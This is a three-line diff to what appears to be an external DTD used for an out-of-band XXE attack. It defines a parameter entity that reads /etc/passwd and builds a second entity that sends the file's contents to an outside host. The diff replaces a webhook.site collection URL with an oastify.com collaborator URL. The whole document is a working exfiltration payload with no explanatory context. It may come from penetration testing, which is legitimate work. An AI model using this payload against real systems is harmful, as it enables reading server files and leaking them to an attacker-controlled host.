@@ -1,3 +1,3 @@
 <!ENTITY % p1 SYSTEM "file:///etc/passwd">
-<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'https://webhook.site/0f43d926-d92e-4c0d-992c-864f64f770b9/?%p1;'>">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://gp9826340nkuv01a09du4j6syj4as0gp.oastify.com/?%p1;'>">
 %p2;
